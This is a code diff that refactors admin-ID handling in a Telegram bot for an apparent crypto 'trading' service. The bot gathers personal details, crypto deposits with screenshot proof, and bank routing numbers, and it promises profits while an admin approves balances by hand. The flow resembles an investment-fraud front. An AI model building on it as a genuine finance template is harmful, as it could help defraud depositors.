@@ -22,7 +22,21 @@ logger = logging.getLogger(__name__)
 
 # Bot configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', 0))
+if not BOT_TOKEN:
+    logger.error("BOT_TOKEN environment variable not set!")
+    raise ValueError("BOT_TOKEN must be set in environment variables")
+
+# Function to get ADMIN_USER_ID dynamically
+def get_admin_id() -> int:
+    admin_id = os.getenv('ADMIN_USER_ID')
+    if not admin_id:
+        logger.error("ADMIN_USER_ID environment variable not set!")
+        return 0  # Default to 0, but this will be handled in functions
+    try:
+        return int(admin_id)
+    except ValueError:
+        logger.error("ADMIN_USER_ID must be a valid integer!")
+        return 0
 
 # In-memory storage
 user_data: Dict[int, Dict[str, Any]] = {}
@@ -65,7 +79,8 @@ def create_cancel_keyboard():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Send welcome message with start button"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features. Use admin commands like /adminpanel or /listusers.")
         return ConversationHandler.END
     keyboard = [
@@ -82,7 +97,8 @@ Your gateway to seamless trading with cutting-edge strategies at Nova Capital We
 async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start user registration process"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -100,7 +116,8 @@ async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get user's full name"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     user_info = get_user_data(user_id)
@@ -114,7 +131,8 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get user's email"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     user_info = get_user_data(user_id)
@@ -128,7 +146,8 @@ async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get user's phone and complete registration"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     user_info = get_user_data(user_id)
@@ -150,7 +169,7 @@ Please create an account for this user on novacapitalwealthpro.com and send them
     reply_markup = InlineKeyboardMarkup(keyboard)
     try:
         await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
+            chat_id=admin_id,
             text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
@@ -166,7 +185,8 @@ Please create an account for this user on novacapitalwealthpro.com and send them
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Display the main menu"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features. Use admin commands like /adminpanel or /listusers."
@@ -215,7 +235,8 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle deposit request"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -238,7 +259,8 @@ async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Show cryptocurrency options"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -261,7 +283,8 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
 async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle cryptocurrency selection"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -281,7 +304,8 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
 async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get deposit amount and show payment details"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     try:
@@ -318,7 +342,8 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Send crypto address as copyable text"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -330,7 +355,7 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     address = crypto_addresses[crypto_name]
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text=f"{crypto_name} Address:\{address}",
+        text=f"{crypto_name} Address: {address}",  # Fixed invalid escape sequence
         parse_mode='Markdown'
     )
     return DEPOSIT_PROOF
@@ -338,7 +363,8 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle payment confirmation"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -356,7 +382,8 @@ async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get deposit proof screenshot and notify admin with confirm button"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     user_info = get_user_data(user_id)
@@ -382,7 +409,7 @@ Click 'Approve' to confirm this deposit."""
     reply_markup = InlineKeyboardMarkup(keyboard)
     try:
         message = await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
+            chat_id=admin_id,
             text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
@@ -390,7 +417,7 @@ Click 'Approve' to confirm this deposit."""
         context.user_data['admin_deposit_message_id'] = message.message_id
         if update.message.photo:
             await context.bot.forward_message(
-                chat_id=ADMIN_USER_ID,
+                chat_id=admin_id,
                 from_chat_id=update.effective_chat.id,
                 message_id=update.message.message_id
             )
@@ -412,7 +439,8 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
     """Handle admin's deposit confirmation via button"""
     query = update.callback_query
     await query.answer()
-    if update.effective_user.id != ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if update.effective_user.id != admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="❌ Unauthorized access."
@@ -454,7 +482,8 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
 async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle withdrawal request"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -478,7 +507,8 @@ async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get withdrawal amount for crypto"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -497,7 +527,8 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
 async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get withdrawal amount for bank transfer"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -516,7 +547,8 @@ async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYP
 async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Process withdrawal amount"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     try:
@@ -553,7 +585,8 @@ async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE
 async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get crypto address for withdrawal"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     context.user_data['crypto_address'] = update.message.text.strip()
@@ -579,7 +612,7 @@ Click 'Approve' to confirm this withdrawal."""
     reply_markup = InlineKeyboardMarkup(keyboard)
     try:
         await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
+            chat_id=admin_id,
             text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
@@ -601,7 +634,8 @@ Click 'Approve' to confirm this withdrawal."""
 async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get bank name"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     context.user_data['bank_name'] = update.message.text.strip()
@@ -614,7 +648,8 @@ async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
 async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get account number"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     context.user_data['account_number'] = update.message.text.strip()
@@ -627,7 +662,8 @@ async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Get routing number and process bank withdrawal"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
     context.user_data['routing_number'] = update.message.text.strip()
@@ -659,7 +695,7 @@ Click 'Approve' to confirm this withdrawal."""
     reply_markup = InlineKeyboardMarkup(keyboard)
     try:
         await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
+            chat_id=admin_id,
             text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
@@ -682,7 +718,8 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
     """Handle admin's withdrawal approval via button"""
     query = update.callback_query
     await query.answer()
-    if update.effective_user.id != ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if update.effective_user.id != admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="❌ Unauthorized access."
@@ -730,7 +767,8 @@ async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAUL
 async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Show copy trading options"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -754,7 +792,8 @@ async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle trading bot selection"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -789,7 +828,8 @@ Our refined strategy will keep you in profits. Monitor your progress in the main
 async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle staking (placeholder)"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -807,7 +847,8 @@ async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle website visit"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -839,7 +880,8 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
 async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Refresh and show updated balance"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -897,7 +939,8 @@ async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Return to main menu"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="Admins cannot access user features."
@@ -910,7 +953,8 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Get user's Telegram ID"""
     user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
+    admin_id = get_admin_id()
+    if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return
     await update.message.reply_text(f"Your User ID is: {user_id}")
@@ -925,15 +969,17 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
 def main() -> None:
     """Start the bot and send admin panel"""
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN environment variable not set!")
-        return
-    if not ADMIN_USER_ID:
-        logger.error("ADMIN_USER_ID environment variable not set!")
-        return
     application = Application.builder().token(BOT_TOKEN).build()
+
     from admin import send_admin_panel, admin_panel  # Import admin functions
-    application.job_queue.run_once(send_admin_panel, 1)
+
+    # Schedule send_admin_panel with admin_id check
+    admin_id = get_admin_id()
+    if admin_id:
+        application.job_queue.run_once(send_admin_panel, 1, data={'admin_id': admin_id})
+    else:
+        logger.warning("ADMIN_USER_ID not set, admin panel will not be sent.")
+
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
@@ -1001,10 +1047,12 @@ def main() -> None:
         fallbacks=[CommandHandler("start", start)],
         per_message=False
     )
+
     application.add_handler(conv_handler)
     application.add_handler(CommandHandler("getid", get_id))
     application.add_handler(CommandHandler("adminpanel", admin_panel))
     application.add_error_handler(error_handler)
+
     logger.info("Starting NCW Trading Bot...")
     application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)
 
